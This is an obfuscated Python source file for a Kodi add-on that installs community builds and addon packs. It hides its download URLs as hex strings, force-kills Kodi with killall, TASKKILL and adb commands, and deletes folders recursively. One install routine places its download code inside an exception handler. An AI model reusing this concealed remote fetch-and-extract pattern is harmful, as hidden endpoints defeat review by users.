 '[CR][CR][COLOR=blue][B]Step 4: Submit build at TotalXBMC[/B][/COLOR]'
 '[CR]Create a thread on the Community Builds section of the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B].[CR]Full details can be found on there of the template you should use when posting.' )
 if 3 - 3: II11iII - iIi1iIiii111 % OooOooo / o0OOOoO0
 if 44 - 44: III1i1i . iIi1iIiii111 * iIIi1iIIi / oO00OO0oo0
def OOOO00o000o ( ) :
 OOoOoo00Oo ( 'Installing a build' , '[COLOR=blue][B]Step 1 (Optional): Backup your system[/B][/COLOR][CR]When selecting an install option you\'ll be asked if you want to create a backup - we strongly recommend creating a backup of your system in case you don\'t like the build and want to revert back. Remember your backup may be quite large so if you\'re using a device with a very small amount of storage we recommend using a USB stick or SD card as the storage location otherwise you may run out of space and the install may fail.'
 '[CR][CR][COLOR=blue][B]Step 2: Choose an install method:[/B][/COLOR][CR][CR]-------------------------------------------------------[CR][CR][COLOR=lime]1. Fresh Install:[/COLOR] This will wipe all existing settings[CR]As the title suggests this will completely wipe all your current Kodi settings. Your settings will be replaced with the ones uploaded by the build author, some builders like to use this method (especially if they have the Live TV PVR setup) so always check the description to find out if they recommend using this method. This method is also great if you feel there\'s content installed on your Kodi install that may be causing issues, it will fully wipe your Kodi and install the build over the top.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=lime]2. Install:[/COLOR] Keep my library & profiles[CR]This will install a build over the top of your existing setup so you won\'t lose anything already installed in Kodi. Your library and any profiles you may have setup will also remain unchanged.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=lime]3. Install:[/COLOR] Keep my library only[CR]This will do exactly the same as number 2 (above) but it will delete any profiles you may have and replace them with the ones the build author has created.'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=lime]4. Install:[/COLOR] Keep my profiles only[CR]Again, the same as number 2 but your library will be replaced with the one created by the build author. If you\'ve spent a long time setting up your library and have it just how you want it then use this with caution and make sure you do a backup!'
 '[CR][CR]-------------------------------------------------------[CR][CR][COLOR=blue][B]Step 3: Replace or keep settings?[/COLOR][/B][CR]When completing the install process (only on options 2-4) you\'ll be asked if you want to keep your existing Kodi settings or replace with the ones in the build. If you choose to keep your settings then only the important skin related settings are copied over from the build. All your other Kodi settings such as screen calibration, region, audio output, resolution etc. will remain intact. Choosing to replace your settings could possibly cause a few issues, unless the build author has specifically recommended you replace the settings with theirs we would always recommend keeping your own.'
 '[CR][CR][COLOR=blue][B]Step 4: [/COLOR][COLOR=red]VERY IMPORTANT[/COLOR][/B][CR]For the install to complete properly Kodi MUST force close, this means forcing it to close via your operating system rather than elegantly via the Kodi menu. By default this add-on will attempt to make your operating system force close Kodi but there are systems that will not allow this (devices that do not allow Kodi to have root permissions).'
 ' Once the final step of the install process has been completed you\'ll see a dialog explaining Kodi is attempting a force close, please be patient and give it a minute. If after a minute Kodi hasn\'t closed or restarted you will need to manually force close. The recommended solution for force closing is to go into your operating system menu and make it force close the Kodi app but if you dont\'t know how to do that you can just pull the power from the unit.'
 ' Pulling the power is fairly safe these days, on most set top boxes it\'s the only way to switch them off - they rarely have a power switch. Even though it\'s considered fairly safe nowadays you do this at your own risk and we would always recommend force closing via the operating system menu.' )
 if 60 - 60: iIIi1iIIi - i1iiI11I
 if 13 - 13: i1i1i11IIi . O0OoO
def IIII1ii1 ( ) :
 OOoOoo00Oo ( 'What is a community build' , 'Community Builds are pre-configured builds of XBMC/Kodi based on different users setups. Have you ever watched youtube videos or seen screenshots of Kodi in action and thought "wow I wish I could do that"? Well now you can have a brilliant setup at the click of a button, completely pre-configured by users on the [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B] forum. If you\'d like to get involved yourself and share your build with the community it\'s very simple to do, just go to the forum where you\'ll find full details or you can follow the guide in this addon.' )
 if 52 - 52: I11iii1Ii - OO0O - OOO00O - O00oo0OO0oOOO + iiiIi1i1I
 if 10 - 10: iiIi / iIIi1iIIi / o0OOOoO0 * O000OO0 / i1iiI11I
def oO0OoiIi111iII1 ( url = 'http://www.iplocation.net/' , inc = 1 ) :
 ooo0O = re . compile ( "<td width='80'>(.+?)</td><td>(.+?)</td><td>(.+?)</td><td>.+?</td><td>(.+?)</td>" ) . findall ( iiI1IiI . http_GET ( url ) . content )
 for o0OIi , IIi1iiI , o0o , oOO00OO0o0O in ooo0O :
  if inc < 2 : I1IiI = xbmcgui . Dialog ( ) ; I1IiI . ok ( 'Check My IP' , "[B][COLOR gold]Your IP Address is: [/COLOR][/B] %s" % o0OIi , '[B][COLOR gold]Your IP is based in: [/COLOR][/B] %s' % o0o , '[B][COLOR gold]Your Service Provider is:[/COLOR][/B] %s' % oOO00OO0o0O )
  inc = inc + 1
  if 35 - 35: O00oo0OO0oOOO * iIIi1iIIi - i1iiI11I + O00oo0OO0oOOO . iiIi
  if 13 - 13: III1i1i % OOO00O % IIiII
  if 25 - 25: iiIi % iIi1iIiii111 * II11iII - I11iii1Ii
def OooOo ( ) :
 I1IiI . ok ( '[COLOR=blue]T[/COLOR]otal[COLOR=dodgerblue]R[/COLOR]evolution' , 'The system will now attempt to force close Kodi.' , 'You may encounter a freeze, if that happens give it a minute' , 'and if it doesn\'t close please restart your system.' )
 if xbmc . getCondVisibility ( 'system.platform.osx' ) :
  print "############   try osx force close  #################"
  try : os . system ( 'killall -9 XBMC' )
  except : pass
  try : os . system ( 'killall -9 Kodi' )
  except : pass
 elif xbmc . getCondVisibility ( 'system.platform.linux' ) :
  print "############   try linux force close  #################"
  try : os . system ( 'killall XBMC' )
  except : pass
  try : os . system ( 'killall Kodi' )
  except : pass
  try : os . system ( 'killall -9 xbmc.bin' )
  except : pass
  try : os . system ( 'killall -9 kodi.bin' )
  except : pass
 elif xbmc . getCondVisibility ( 'system.platform.android' ) :
  print "############   try android force close  #################"
  try : os . system ( 'adb shell am force-stop org.xbmc.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.kodi' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc.xbmc' )
  except : pass
  try : os . system ( 'adb shell am force-stop org.xbmc' )
  except : pass
 elif xbmc . getCondVisibility ( 'system.platform.windows' ) :
  print "############   try windows force close  #################"
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill XBMC.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'tskill Kodi.exe' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im Kodi.exe /f' )
  except : pass
  try :
   os . system ( '@ECHO off' )
   os . system ( 'TASKKILL /im XBMC.exe /f' )
  except : pass
 else :
  print "############   try atv force close  #################"
  try : os . system ( 'killall AppleTV' )
  except : pass
  print "############   try raspbmc force close  #################"
  try : os . system ( 'sudo initctl stop kodi' )
  except : pass
  try : os . system ( 'sudo initctl stop xbmc' )
  except : pass
  if 95 - 95: OoOo % OO * OoOo + III1i1i . OO % iiIi
  if 6 - 6: OooOooo - OOO00O * O00oo0OO0oOOO + OooOooo % O00oo0OO0oOOO
def OOO00000o0 ( ) :
 O0OoO000O0OO = xbmc . translatePath ( 'special://logpath' )
 O00o00O = xbmc . getInfoLabel ( "System.BuildVersion" )
 iiii111II = float ( O00o00O [ : 4 ] )
 if iiii111II < 14 :
  OOOO000Ooo0O = os . path . join ( O0OoO000O0OO , 'xbmc.log' )
  OOoOoo00Oo ( 'XBMC Log' , OOOO000Ooo0O )
 else :
  OOOO000Ooo0O = os . path . join ( O0OoO000O0OO , 'kodi.log' )
  OOoOoo00Oo ( 'Kodi Log' , OOOO000Ooo0O )
  if 96 - 96: O000OO0 + OO . iiiIi1i1I
  if 54 - 54: II11iII . iiiIi1i1I / i1i1i11IIi % OoOo / OO
def OOoOoOo0 ( ) :
 I1IiI . ok ( "Restore local guisettings fix" , "You should [COLOR=lime]ONLY[/COLOR] use this option if the guisettings fix" , "is failing to download via the addon. Installing via this" , "method means you do not receive notifications of updates" )
 iIi ( )
 if 52 - 52: i1iiI11I
def iiIiIi1iI ( mypath , dirname ) :
 import xbmcvfs
 if 84 - 84: O000OO0
 if 44 - 44: iiIi * oO00OO0oo0 / O000OO0
 if not xbmcvfs . exists ( mypath ) :
  try :
   xbmcvfs . mkdirs ( mypath )
  except :
   xbmcvfs . mkdir ( mypath )
   if 75 - 75: iiIi . OO0O + I11iii1Ii / iIi1iIiii111 - OoOo % iIi1iIiii111
 O0OooooO0o0O0 = os . path . join ( mypath , dirname )
 if 74 - 74: OooOooo / iiiIi1i1I % iiIi
 if not xbmcvfs . exists ( O0OooooO0o0O0 ) :
  try :
   xbmcvfs . mkdirs ( O0OooooO0o0O0 )
  except :
   xbmcvfs . mkdir ( O0OooooO0o0O0 )
   if 52 - 52: O0OoO % OOO00O
 return O0OooooO0o0O0
 if 25 - 25: IIiII / IIiII % iiIi - i1i1i11IIi * o0OOOoO0
 if 23 - 23: oO00OO0oo0
def OOooOoO ( mode ) :
 if not mode . endswith ( "premium" ) and not mode . endswith ( "public" ) and not mode . endswith ( "private" ) :
  ii1i1i = II11iIII1i1I ( heading = "Search for content" )
  if ( not ii1i1i ) : return False , 0
  oOO0oo = urllib . quote_plus ( ii1i1i )
  if mode == 'tutorials' :
   o0OO0OOO0O ( 'name=' + oOO0oo )
  if mode == 'hardware' :
   ooOOooo0ooo00 ( 'name=' + oOO0oo )
  if mode == 'news' :
   oOOOo0o ( 'name=' + oOO0oo )
 if mode . endswith ( "premium" ) or mode . endswith ( "public" ) or mode . endswith ( "private" ) :
  o0oO ( 'folder' , 'Search By Name' , mode + '&name=' , 'search_builds' , 'Manual_Search.png' , '' , '' , '' )
  o0oO ( 'folder' , 'Search By Uploader' , mode + '&author=' , 'search_builds' , 'Search_Genre.png' , '' , '' , '' )
  o0oO ( 'folder' , 'Search By Audio Addons Installed' , mode + '&audio=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  o0oO ( 'folder' , 'Search By Picture Addons Installed' , mode + '&pics=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  o0oO ( 'folder' , 'Search By Program Addons Installed' , mode + '&progs=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  o0oO ( 'folder' , 'Search By Video Addons Installed' , mode + '&vids=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  o0oO ( 'folder' , 'Search By Skins Installed' , mode + '&skins=' , 'search_builds' , 'Search_Addons.png' , '' , '' , '' )
  if 24 - 24: O00oo0OO0oOOO + OoOo - II11iII
  if 29 - 29: OoOo + oO00OO0oo0 . III1i1i
def o0oo0Oo ( url ) :
 i1i1I1II = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4c61746573744e6577732f4c61746573744e6577732e7068703f69643d2573'
 IIII = binascii . unhexlify ( i1i1I1II ) % ( url )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0O0OOO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( iiIiI )
 II1 = re . compile ( 'author="(.+?)"' ) . findall ( iiIiI )
 o0o0oO = re . compile ( 'date="(.+?)"' ) . findall ( iiIiI )
 OOoO00 = re . compile ( 'content="(.+?)###END###"' ) . findall ( iiIiI )
 if 92 - 92: IIiII / III1i1i * OoOo - IIiII
 i1II1 = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
 o0o00oO0oo000 = II1 [ 0 ] if ( len ( II1 ) > 0 ) else ''
 Ii1 = o0o0oO [ 0 ] if ( len ( o0o0oO ) > 0 ) else ''
 OOo0 = OOoO00 [ 0 ] if ( len ( OOoO00 ) > 0 ) else ''
 oooOo00000 = OO0O0ooOOO00 ( OOo0 )
 iIIII1iIIii = str ( '[COLOR=gold]Source: [/COLOR]' + o0o00oO0oo000 + '     [COLOR=gold]Date: [/COLOR]' + Ii1 + '[CR][CR][COLOR=lime]Details: [/COLOR][CR]' + oooOo00000 )
 OOoOoo00Oo ( i1II1 , iIIII1iIIii )
 if 45 - 45: III1i1i * OO + oO00OO0oo0 - OO0O - i1iiI11I
 if 5 - 5: OO0O % O000OO0 % O0OoO % OOO00O
def I1Iiii ( url ) :
 if o0O == 'true' :
  o0oO ( '' , '[COLOR=orange]Latest ' + I1IiiI + ' news[/COLOR]' , I1IiiI , 'notify_msg' , 'LatestNews.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=yellow]Manual Search[/COLOR]' , 'news' , 'manual_search' , 'Manual_Search.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=lime][All News][/COLOR] From all sites' , str ( url ) + '' , 'grab_news' , 'Latest.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Official Kodi.tv News' , str ( url ) + '&author=Official%20Kodi' , 'grab_news' , 'XBMC.png' , '' , '' , '' )
 o0oO ( 'folder' , 'OpenELEC News' , str ( url ) + '&author=OpenELEC' , 'grab_news' , 'OpenELEC.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Raspbmc News' , str ( url ) + '&author=Raspbmc' , 'grab_news' , 'Raspbmc.png' , '' , '' , '' )
 o0oO ( 'folder' , 'TotalXBMC News' , str ( url ) + '&author=TotalXBMC' , 'grab_news' , 'TOTALXBMC.png' , '' , '' , '' )
 o0oO ( 'folder' , 'XBMC4Xbox News' , str ( url ) + '&author=XBMC4Xbox' , 'grab_news' , 'XBMC4Xbox.png' , '' , '' , '' )
 if 22 - 22: iIi1iIiii111 * IIiII + OoOo - IIiII / i1i1i11IIi
 if 18 - 18: iiiIi1i1I
def i1i1Ii1IiIII ( title , message , times , icon ) :
 icon = iIii1 + icon
 xbmc . executebuiltin ( "XBMC.Notification(" + title + "," + message + "," + times + "," + icon + ")" )
 if 9 - 9: IIiII - o0OOOoO0 + III1i1i / iIIi1iIIi % iiiIi1i1I
def oO000o0OO0OO0 ( url ) :
 III1III11II = xbmc . translatePath ( os . path . join ( i1i1II , oo000 , 'notification.txt' ) )
 if not os . path . exists ( III1III11II ) :
  oOooO00o0O = open ( III1III11II , mode = 'w' )
  oOooO00o0O . write ( '20150101000000' )
  oOooO00o0O . close ( )
 i11ii1I1 = open ( III1III11II , 'r' ) . read ( )
 i1iI = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f6e6f746966793f726573656c6c65723d2573'
 IIII = binascii . unhexlify ( i1iI ) % ( I1IiiI )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 Ooiiii11iI1 = re . compile ( 'notify="(.+?)"' ) . findall ( iiIiI )
 Oo00Oo = Ooiiii11iI1 [ 0 ] if ( len ( Ooiiii11iI1 ) > 0 ) else 'No news items available'
 o0o0oO = re . compile ( 'date="(.+?)"' ) . findall ( iiIiI )
 iIiO0O = o0o0oO [ 0 ] if ( len ( o0o0oO ) > 0 ) else ''
 oOOoooo = iIiO0O . replace ( '-' , '' ) . replace ( ' ' , '' ) . replace ( ':' , '' )
 if int ( i11ii1I1 ) < int ( oOOoooo ) :
  oOooO00o0O = open ( III1III11II , mode = 'w' )
  oOooO00o0O . write ( oOOoooo )
  oOooO00o0O . close ( )
  I1IiI . ok ( 'Latest ' + I1IiiI + ' News' , Oo00Oo )
 else :
  I1IiI . ok ( 'Latest ' + I1IiiI + ' News' , Oo00Oo )
  if 70 - 70: iIIi1iIIi . II11iII . iIIi1iIIi - i1iiI11I
  if 92 - 92: I11iii1Ii
def o00oooO0Oo ( url ) :
 I1I1 = urllib2 . Request ( url )
 I1I1 . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 ooo0 = urllib2 . urlopen ( I1I1 )
 iiIiI = ooo0 . read ( )
 ooo0 . close ( )
 return iiIiI . replace ( '\r' , '' ) . replace ( '\n' , '' ) . replace ( '\t' , '' )
 if 36 - 36: OO . O0OoO * iiIi - O00oo0OO0oOOO
 if 60 - 60: OO0O . iIIi1iIIi / i1iiI11I + OO0O * OO
def OoooO00OoO0 ( name , url , iconimage , description ) :
 iiIiI1I1I1IiI = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data/script.tvguidedixie/' , '' ) )
 I1IIII11 = os . path . join ( iiIiI1I1I1IiI , 'local.ini' )
 OO0OO0OO = I1IiI . yesno ( 'OffsideStreams / OnTapp.TV Integration ' , str ( description ) , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if OO0OO0OO == 0 :
  return
 elif OO0OO0OO == 1 :
  IIIiIiI11iIi = I1IIII11
  if not os . path . exists ( iiIiI1I1I1IiI ) :
   I1IiI . ok ( '[COLOR=red]OnTapp Not Installed[/COLOR]' , 'The On-Tapp.TV addon has not been found on this system, please install then run this again.' )
  else :
   I1i1I1I11IiiI ( url , IIIiIiI11iIi )
   I1IiI . ok ( 'OSS Integration complete' , 'The OffsideStreams local.ini file has now been copied to your OnTapp.TV directory' )
   if 71 - 71: OOO00O . oO00OO0oo0
   if 56 - 56: III1i1i * iIIi1iIIi + iIIi1iIIi * i1iiI11I / OOO00O * OO
def IiOo0O0O ( url ) :
 o0oO ( 'folder' , '[COLOR=yellow]1. Install:[/COLOR]  Installation tutorials (e.g. flashing a new OS)' , str ( url ) + '&thirdparty=InstallTools' , 'grab_tutorials' , 'Install.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Add-on Tools:[/COLOR]  Add-on maintenance and coding tutorials' , str ( url ) + '&thirdparty=AddonTools' , 'grab_tutorials' , 'ADDONTOOLS.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Audio Tools:[/COLOR]  Audio related tutorials' , str ( url ) + '&thirdparty=AudioTools' , 'grab_tutorials' , 'AUDIOTOOLS.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Gaming Tools:[/COLOR]  Integrate a gaming section into your setup' , str ( url ) + '&thirdparty=GamingTools' , 'grab_tutorials' , 'gaming_portal.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Image Tools:[/COLOR]  Tutorials to assist with your pictures/photos' , str ( url ) + '&thirdparty=ImageTools' , 'grab_tutorials' , 'IMAGETOOLS.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Library Tools:[/COLOR]  Music and Video Library Tutorials' , str ( url ) + '&thirdparty=LibraryTools' , 'grab_tutorials' , 'LIBRARYTOOLS.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Skinning Tools:[/COLOR]  All your skinning advice' , str ( url ) + '&thirdparty=SkinningTools' , 'grab_tutorials' , 'SKINNINGTOOLS.png' , '' , '' , '' )
 o0oO ( 'folder' , '[COLOR=dodgerblue]Video Tools:[/COLOR]  All video related tools' , str ( url ) + '&thirdparty=VideoTools' , 'grab_tutorials' , 'VIDEOTOOLS.png' , '' , '' , '' )
 if 8 - 8: oO00OO0oo0 * III1i1i + i1i1i11IIi . i1iiI11I % IIiII / IIiII
 if 70 - 70: OoOo + iIi1iIiii111
def i1I1I1iiII ( xmlfile ) :
 o0oO0O00O0Oo0 = Oo0O0OOOoo ( xmlfile , ii . getAddonInfo ( 'path' ) , 'DefaultSkin' , close_time = 34 )
 o0oO0O00O0Oo0 . doModal ( )
 del o0oO0O00O0Oo0
 if 53 - 53: iiiIi1i1I . iiiIi1i1I - IIiII / iIIi1iIIi - OooOooo % OoOo
def O0OiI ( ) :
 oOoO0 = '687474703a2f2f746f74616c78626d632e74762f746f74616c7265766f6c7574696f6e2f4164646f6e5f5061636b732f6164646f6e7061636b732e747874'
 Iii1II1ii = binascii . unhexlify ( oOoO0 )
 iiIiI = o00oooO0Oo ( Iii1II1ii ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O = re . compile ( 'name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"' ) . findall ( iiIiI )
 for i1II1 , i1IiII1i1I , oOoooo000Oo00 , OOoo , iIIII1iIIii in ooo0O :
  o0oO ( 'folder2' , i1II1 , i1IiII1i1I , 'popularwizard' , oOoooo000Oo00 , OOoo , '' , iIIII1iIIii )
  if 95 - 95: O000OO0
def i111 ( name , url , iconimage , description ) :
 OOoOoo00Oo ( name , description )
 OO0OO0OO = I1IiI . yesno ( name , 'This will install the ' + name , '' , 'Are you sure you want to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if OO0OO0OO == 0 :
  return
 elif OO0OO0OO == 1 :
  import downloader
  IIIiIiI11iIi = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
  OO0o = xbmc . translatePath ( os . path . join ( 'special://' , 'home' ) )
  o0OOO = xbmcgui . DialogProgress ( )
  o0OOO . create ( "Addon Packs" , "Downloading " + name + " addon pack." , '' , 'Please Wait' )
  OOOOOOoo0oO = os . path . join ( IIIiIiI11iIi , name + '.zip' )
  try :
   os . remove ( OOOOOOoo0oO )
  except :
   pass
   downloader . download ( url , OOOOOOoo0oO , o0OOO )
   time . sleep ( 3 )
   o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
   xbmc . executebuiltin ( "XBMC.Extract(%s,%s)" % ( OOOOOOoo0oO , OO0o ) )
   I1IiI . ok ( "Total Installer" , "All Done. Your addons will now go through the update process, it may take a minute or two until the addons are working." )
   time . sleep ( 1 )
   xbmc . executebuiltin ( 'UpdateLocalAddons' )
   xbmc . executebuiltin ( 'UpdateAddonRepos' )
   if 71 - 71: I11iii1Ii
   if 75 - 75: iIIi1iIIi
   if 16 - 16: i1i1i11IIi + II11iII * OooOooo . O0OoO
def IiIiIIiii1I ( url ) :
 I1I1i1I1I1I1 = zipfile . ZipFile ( url , "r" )
 for iI11IiIiiII1 in I1I1i1I1I1I1 . namelist ( ) :
  if 'guisettings.xml' in iI11IiIiiII1 :
   iIIiiIIIi1I = I1I1i1I1I1I1 . read ( iI11IiIiiII1 )
   I11iii1i = '<setting type="(.+?)" name="%s.(.+?)">(.+?)</setting>' % oOOoO0
   ooo0O = re . compile ( I11iii1i ) . findall ( iIIiiIIIi1I )
   for type , ii1i1Iii , oO00oO00O0Oo in ooo0O :
    oO00oO00O0Oo = oO00oO00O0Oo . replace ( '&quot;' , '' ) . replace ( '&amp;' , '&' )
    xbmc . executebuiltin ( "Skin.Set%s(%s,%s)" % ( type . title ( ) , ii1i1Iii , oO00oO00O0Oo ) )
  if 'favourites.xml' in iI11IiIiiII1 :
   iIIiiIIIi1I = I1I1i1I1I1I1 . read ( iI11IiIiiII1 )
   Ii = open ( I11 , mode = 'w' )
   Ii . write ( iIIiiIIIi1I )
   Ii . close ( )
  if 'sources.xml' in iI11IiIiiII1 :
   iIIiiIIIi1I = I1I1i1I1I1I1 . read ( iI11IiIiiII1 )
   Ii = open ( Oo0o0000o0o0 , mode = 'w' )
   Ii . write ( iIIiiIIIi1I )
   Ii . close ( )
  if 'advancedsettings.xml' in iI11IiIiiII1 :
   iIIiiIIIi1I = I1I1i1I1I1I1 . read ( iI11IiIiiII1 )
   Ii = open ( oOo0oooo00o , mode = 'w' )
   Ii . write ( iIIiiIIIi1I )
   Ii . close ( )
  if 'RssFeeds.xml' in iI11IiIiiII1 :
   iIIiiIIIi1I = I1I1i1I1I1I1 . read ( iI11IiIiiII1 )
   Ii = open ( oo0o0O00 , mode = 'w' )
   Ii . write ( iIIiiIIIi1I )
   Ii . close ( )
  if 'keyboard.xml' in iI11IiIiiII1 :
   iIIiiIIIi1I = I1I1i1I1I1I1 . read ( iI11IiIiiII1 )
   Ii = open ( oO , mode = 'w' )
   Ii . write ( iIIiiIIIi1I )
   Ii . close ( )
   if 88 - 88: o0OOOoO0 - iiiIi1i1I % oO00OO0oo0 % II11iII * iiIi
   if 40 - 40: O000OO0
def oOOo0oo0O ( recursive_location , remote_path ) :
 if not os . path . exists ( recursive_location ) :
  os . makedirs ( recursive_location )
 iiIiI = o00oooO0Oo ( remote_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( iiIiI )
 for iII1iii in ooo0O :
  i11i1iiiII = xbmc . translatePath ( os . path . join ( recursive_location , iII1iii ) )
  if '/' not in iII1iii :
   try :
    o0OOO . update ( 0 , "Downloading [COLOR=yellow]" + iII1iii + '[/COLOR]' , '' , 'Please wait...' )
    downloader . download ( remote_path + iII1iii , i11i1iiiII , o0OOO )
   except : print "failed to install" + iII1iii
  if '/' in iII1iii and '..' not in iII1iii and 'http' not in iII1iii :
   iI1Ii11 = remote_path + iII1iii
   oOOo0oo0O ( i11i1iiiII , iI1Ii11 )
  else : pass
  if 93 - 93: OoOo / OOO00O / IIiII + II11iII + oO00OO0oo0
  if 16 - 16: OoOo - o0OOOoO0 . O000OO0
def oOo000o ( ) :
 I1IiI . ok ( "Register to unlock features" , "To get the most out of this addon please register at" , "the TotalXBMC forum for free." , "Visit [COLOR=lime]www.totalxbmc.tv/new-forum[/COLOR] for more details." )
 if 64 - 64: III1i1i
 if 41 - 41: O0OoO % O00oo0OO0oOOO
def oo0O0oOOO0o ( ) :
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Delete Addon_Data Folder?' , 'This will free up space by deleting your addon_data' , 'folder. This contains all addon related settings' , 'including username and password info.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if OO0OO0OO == 1 :
  O000O ( )
  I1IiI . ok ( "Addon_Data Removed" , '' , 'Your addon_data folder has now been removed.' , '' )
  if 70 - 70: O000OO0 % iIi1iIiii111 . i1i1i11IIi
def Ii1111iiI ( url ) :
 I1I = str ( url ) . replace ( o0oO0 , i1i1II )
 if I1IiI . yesno ( "Remove" , '' , "Do you want to Remove" ) :
  for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( url ) :
   for Ii in I1iii :
    os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
   for i1Ii11II in O0oooo00o0Oo :
    shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
  os . rmdir ( url )
  try :
   for OooOo000OOOOo , O0oooo00o0Oo , I1iii in os . walk ( I1I ) :
    for Ii in I1iii :
     os . unlink ( os . path . join ( OooOo000OOOOo , Ii ) )
    for i1Ii11II in O0oooo00o0Oo :
     shutil . rmtree ( os . path . join ( OooOo000OOOOo , i1Ii11II ) )
   os . rmdir ( I1I )
  except : pass
  xbmc . executebuiltin ( 'Container.Refresh' )
  if 53 - 53: OooOooo
  if 84 - 84: I11iii1Ii
def o0OOi11Ii1 ( ) :
 iiii1I1 ( )
 iI11IiIiiII1 = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to DELETE' , 'files' , '.zip' , False , False , i1iiIIiiI111 )
 if iI11IiIiiII1 != i1iiIIiiI111 :
  I11IIIII = ntpath . basename ( iI11IiIiiII1 )
  OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Delete Backup File' , 'This will completely remove ' + I11IIIII , 'Are you sure you want to delete?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Delete' )
  if OO0OO0OO == 1 :
   os . remove ( iI11IiIiiII1 )
   if 53 - 53: iiIi . iiIi + O00oo0OO0oOOO - iIIi1iIIi + OO0O
   if 44 - 44: OO - O0OoO
def OOOi1iIIiiIiII ( ) :
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Remove All Crash Logs?' , 'There is absolutely no harm in doing this, these are' , 'log files generated when Kodi crashes and are' , 'only used for debugging purposes.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if OO0OO0OO == 1 :
  I11iiIIiI1ii ( )
  I1IiI . ok ( "Crash Logs Removed" , '' , 'Your crash log files have now been removed.' , '' )
  if 20 - 20: OOO00O . I11iii1Ii * iIIi1iIIi
  if 71 - 71: O000OO0 . II11iII / II11iII * iIi1iIiii111 * I11iii1Ii
def IiiI11 ( ) :
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Delete Packages Folder?' , 'This will free up space by deleting the zip install' , 'files of your addons. The only downside is you\'ll no' , 'longer be able to rollback to older versions.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if OO0OO0OO == 1 :
  OOooo ( )
  I1IiI . ok ( "Packages Removed" , '' , 'Your zip install files have now been removed.' , '' )
  if 60 - 60: OOO00O * OOO00O / iiIi
  if 65 - 65: i1i1i11IIi % o0OOOoO0 . iiIi * O00oo0OO0oOOO * I11iii1Ii
def iiiO00O00O000OOO ( ) :
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Clear Cached Images?' , 'This will clear your textures13.db file and remove' , 'your Thumbnails folder. These will automatically be' , 'repopulated after a restart.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if OO0OO0OO == 1 :
  II11IiI1 ( )
  oo0i1iIIi1II1iiI ( iiIIIII1i1iI )
  OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( 'Quit Kodi Now?' , 'Cache has been successfully deleted.' , 'You must now restart Kodi, would you like to quit now?' , '' , nolabel = 'I\'ll restart later' , yeslabel = 'Yes, quit' )
  if OO0OO0OO == 1 :
   try : xbmc . executebuiltin ( "RestartApp" )
   except : OooOo ( )
   if 21 - 21: I11iii1Ii
   if 63 - 63: IIiII . III1i1i * IIiII + i1iiI11I
def II11IiI1 ( ) :
 Ii1iIi = xbmc . translatePath ( 'special://home/userdata/Database/Textures13.db' )
 try :
  OOo0OOOoOOo = database . connect ( Ii1iIi )
  III = OOo0OOOoOOo . cursor ( )
  III . execute ( "DROP TABLE IF EXISTS path" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
